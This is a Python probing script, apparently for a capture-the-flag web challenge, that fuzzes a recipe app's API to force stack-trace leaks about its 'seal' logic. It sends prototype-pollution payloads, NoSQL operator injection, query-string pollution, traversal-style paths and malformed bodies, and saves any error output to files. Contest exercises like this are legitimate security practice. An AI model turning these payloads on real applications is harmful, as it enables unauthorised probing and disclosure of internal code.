#!/usr/bin/env python3
"""Hunt for a stack trace. Everything else about the seal rule is guesswork.

Every content-based theory ("legendary recipe" must contain X) and every structural
theory ("batches the inspector cannot seal get escalated to the Chief") is currently
unfalsifiable because we cannot see the handler. An Express app that is not started with
NODE_ENV=production answers a thrown error with a code frame plus node_modules paths,
which would settle the seal logic in one response. So: feed each endpoint the kinds of
input that make handlers throw (wrong types, nulls, arrays where objects are expected,
invalid ObjectIds, resubmitting a finished batch, bodies the parser does not expect) and
report any answer that is not one of the app's own clean 4xx JSON errors.
"""
import json
import sys
import time

from cc import Client, new_baker

def w(*a):
    line = " ".join(str(x) for x in a) + "\n"
    sys.stdout.buffer.write(line.encode("utf-8", "replace"))
    sys.stdout.flush()

BAD = "at Object.<anonymous>|node_modules|TypeError|ReferenceError|MongoServerError|Error:|thrownew|codeFrame|exports.mapper|internal/process".split("|")

u, c, _ = new_baker("lk")
w("user %s" % u)
code, out, dt = c.post("/api/recipe", {"title": "target", "ingredients": [{"name": "flour", "value": "1"}]})
rid = out["id"]
w("rid", rid)


def hit(label, method, path, body=None, raw=None, headers=None):
    if raw is not None:
        hdrs = {"User-Agent": "x", "Content-Type": headers.get("ct", "application/json") if headers else "application/json"}
        hdrs.update({k: v for k, v in (headers or {}).items() if k != "ct"})
        import urllib.request, urllib.error
        req = urllib.request.Request("https://tomorrow.web.2026.sunshinectf.games" + path,
                                     data=raw.encode(), headers={**hdrs, "Cookie": "; ".join("%s=%s" % kv for kv in c.jar.items())}, method=method)
        try:
            r = urllib.request.urlopen(req, timeout=30)
            code, txt = r.status, r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            code, txt = e.code, e.read().decode("utf-8", "replace")
        except Exception as e:
            w("  %-42s EXC %r" % (label, e)); return
    else:
        code, txt, dt = c.req(method, path, body=body, headers=headers)
    marks = [b for b in BAD if isinstance(txt, str) and b in txt]
    tag = "" if code and code < 500 and not marks else "  <<<"
    w("  %-42s %s %s%s" % (label, code, (str(txt)[:110].replace("\n", " ") if not isinstance(txt, dict) else json.dumps(txt)[:110]), tag))
    if marks or (code and code >= 500):
        with open("../files/leak_%s.txt" % label.replace(" ", "_").replace("/", "_")[:40], "w", encoding="utf-8") as f:
            f.write(str(txt))
        w("      !!! markers=%s (saved)" % marks[:4])
    time.sleep(0.25)


w("=== POST /api/recipe : type confusion ===")
for label, body in [
    ("empty obj", {}), ("array body", []), ("null body", None), ("string body", "x"),
    ("ingredients null", {"ingredients": None}),
    ("ingredients str", {"ingredients": "flour"}),
    ("ingredients dict", {"ingredients": {"name": "flour"}}),
    ("ing [null]", {"ingredients": [None]}),
    ("ing [{}]", {"ingredients": [{}]}),
    ("ing name int", {"ingredients": [{"name": 1, "value": 2}]}),
    ("ing name dict", {"ingredients": [{"name": {"a": 1}, "value": "x"}]}),
    ("ing nested array", {"ingredients": [[{"name": "a", "value": "b"}]]}),
    ("title dict", {"title": {"$ne": 1}, "ingredients": [{"name": "a", "value": "b"}]}),
    ("title list", {"title": ["a"], "ingredients": [{"name": "a", "value": "b"}]}),
    ("huge title", {"title": "T" * 5000, "ingredients": [{"name": "a", "value": "b"}]}),
    ("proto dict", {"__proto__": {"seal": "chief"}, "title": "p", "ingredients": [{"name": "a", "value": "b"}]}),
    ("deep proto", {"a": {"b": {"__proto__": {"seal": "chief"}}}, "title": "p", "ingredients": [{"name": "a", "value": "b"}]}),
]:
    hit("recipe " + label, "POST", "/api/recipe", body=body)

w("=== raw / odd content types ===")
hit("recipe raw badjson", "POST", "/api/recipe", raw='{"title": "x", "ingredients": [')
hit("recipe form", "POST", "/api/recipe", raw="title=x&ingredients=a", headers={"ct": "application/x-www-form-urlencoded"})
hit("recipe text", "POST", "/api/recipe", raw="hello", headers={"ct": "text/plain"})
hit("seal raw badjson", "POST", "/api/seal", raw="{")
hit("seal array", "POST", "/api/seal", body=[1, 2])

w("=== query-string pollution ===")
for q in ["?ingredients[0][name]=a", "?__proto__[seal]=chief", "?title[]=x", "?a=b&c=%", "?id[]=1"]:
    hit("recipe POST " + q, "POST", "/api/recipe" + q,
        body={"title": "q", "ingredients": [{"name": "a", "value": "b"}]})

w("=== ObjectId handling on GET pages ===")
for p in ["/recipe/zz", "/recipe/" + "g" * 24, "/recipe/" + "0" * 24, "/recipe/?id=1",
          "/review/zz", "/review/" + "0" * 24, "/recipe/%24%2e%2e", "/review/..%2f",
          "/api/recipe/" + "0" * 24 + "/submit"]:
    code, txt, dt = c.get(p)
    body = str(txt)[:90].replace("\n", " ")
    marks = [b for b in BAD if isinstance(txt, str) and b in txt]
    w("  GET %-38s %s %s %s" % (p, code, body, marks and "!!! " + str(marks)))
    if code >= 500:
        open("../files/leak_get.txt", "a", encoding="utf-8").write(p + "\n" + str(txt) + "\n---\n")

w("=== state confusion on submit ===")
hit("submit ok", "POST", "/api/recipe/%s/submit" % rid, body={})
time.sleep(8)
hit("submit twice", "POST", "/api/recipe/%s/submit" % rid, body={})
hit("submit own other", "POST", "/api/recipe/%s/submit" % rid, body={"recipeId": rid, "status": "queued"})
code, out, dt = c.post("/api/recipe", {"title": "draft2", "ingredients": [{"name": "a", "value": "b"}]})
rid2 = out["id"]
hit("submit nonexistent hex", "POST", "/api/recipe/" + "a" * 24 + "/submit", body={})
hit("submit bad id", "POST", "/api/recipe/nope/submit", body={})
hit("submit array route", "POST", "/api/recipe/%s/submit/extra" % rid2, body={})
w("done")
